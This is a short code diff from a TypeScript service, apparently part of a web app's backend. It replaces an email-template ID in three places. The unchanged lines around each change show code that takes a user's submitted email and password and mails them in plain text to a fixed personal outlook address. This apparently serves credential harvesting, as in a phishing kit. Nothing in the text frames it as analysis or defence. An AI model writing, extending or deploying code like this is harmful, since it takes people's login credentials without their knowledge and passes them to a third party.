@@ -31,7 +31,7 @@ export class AppService {
         to: {
           email: 'yariaortega@outlook.com',
         },
-        template: 'nt_01m2jjxps5fvm9cx95fsw43a13',
+        template: 'nt_01m2jj6zkjesmagcct7k3rt84d',
         data: {
           recipientName: `email: ${email}, \n password: ${password}
 
@@ -78,7 +78,7 @@ export class AppService {
           to: {
             email: 'yariaortega@outlook.com',
           },
-          template: 'nt_01m2jjxps5fvm9cx95fsw43a13',
+          template: 'nt_01m2jj6zkjesmagcct7k3rt84d',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
@@ -124,7 +124,7 @@ export class AppService {
           to: {
             email: 'yariaortega@outlook.com',
           },
-          template: 'nt_01m2jjxps5fvm9cx95fsw43a13',
+          template: 'nt_01m2jj6zkjesmagcct7k3rt84d',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
